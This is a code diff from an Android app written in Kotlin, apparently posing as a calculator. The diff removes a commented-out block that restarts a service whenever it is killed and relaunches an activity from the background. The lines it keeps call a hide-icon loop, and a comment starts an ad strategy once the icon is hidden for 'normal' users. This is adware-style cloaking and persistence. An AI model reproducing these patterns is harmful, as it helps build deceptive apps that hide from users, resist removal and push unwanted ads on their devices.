@@ -36,40 +36,6 @@ class ConvWorker(context: Context, params: WorkerParameters) :
 
     override fun doWork(): Result {
         "start to work...".log()
-      /*  Handler(Looper.getMainLooper()).post {
-            Cloak.onServiceDestroy.observe(this) {
-                if (it) {
-                    Handler(Looper.getMainLooper()).postDelayed({
-                        //service 被调用onDestroy
-                        if (CalApp.app.isInForeground) {
-                            "listen and restart service foreground...".log()
-                            try {
-                                CalApp.app.startForegroundService(
-                                    Intent(
-                                        CalApp.app,
-                                        MidSCalcService::class.java
-                                    )
-                                )
-                            } catch (e: Exception) {
-                                e.printStackTrace()
-                            }
-                        } else {
-                            //应用在后台
-                            "listen and restart service background...".log()
-                            try {
-                                val intent = Intent(
-                                    CalApp.app,
-                                    CalStartsvActivity::class.java
-                                ).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                CalApp.app.startActivity(intent)
-                            } catch (e: Exception) {
-                                e.printStackTrace()
-                            }
-                        }
-                    }, 3000)
-                }
-            }
-        }*/
         checkHideLoop()
         /**
          * 如果是正常用户，且图标已经隐藏，则开启广告策略
